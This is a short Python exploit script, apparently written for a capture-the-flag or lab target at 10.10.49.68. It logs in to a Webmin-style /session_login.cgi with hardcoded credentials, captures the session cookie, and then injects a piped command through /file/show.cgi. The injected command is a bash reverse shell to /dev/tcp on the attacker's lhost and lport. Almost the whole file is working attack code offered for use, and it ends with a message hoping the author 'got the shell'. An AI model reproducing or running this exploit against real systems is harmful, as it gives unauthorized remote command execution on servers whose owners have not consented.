#!/bin/python3
#@author alienX

import requests
import string, secrets

#initialize  payload section , user input here
author = ' Author: erick alex, hacker boi, pro hacker'
print(author)
lhost = input("Enter your local ip: ")
lport = input("Enter your lport: ")      

targetIP = "10.10.49.68"
#login  requirements  needed
#sending post request of  credentials  via  /sessions_login.cgi
#check the status code (check fail OR successful)
#don't forget the format cookie

data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
url = f"http://{targetIP}/session_login.cgi"
r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

#check the status code using a if condition
if r.status_code == 302 and r.cookies["sid"] != None:
	print("[+] Login Successfull, executing payload")
else:
	print("[-] Login Failed")

c = r.cookies["sid"]
s = r.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(';')[0].split()
si = r.headers['Set-Cookie'].split('=')[1].split(';')[0].split()
sid = c.strip("/=; ")
print(c)
print(s)
print(si)
print(sid)

# exploit part 
#requirements with from the CVE
#generate 5 random alphanumeric chars
#store the payload  and encode it base64 and send it via socket conn
#send the payload with either POST OR GET  attached with the 5 random char with piped malicious command
#open a shell via payload(send)
#payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1

#part 1 : generating five random chars
def rand():
	alphaNum = string.ascii_letters + string.digits
	randChar = ''.join(secrets.choice(alphaNum) for i in range(5))
	return randChar
for i in range(1,20):
	print(rand())
#part 2: sending encoded payload and execute get executed
def payload():
	payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"
	return payload

#binding our payload and malicious command via url and execute the payload
exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"
req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)

print("HOPE U GOT THE SHELL Mr alienX if not check the your ip and lport")
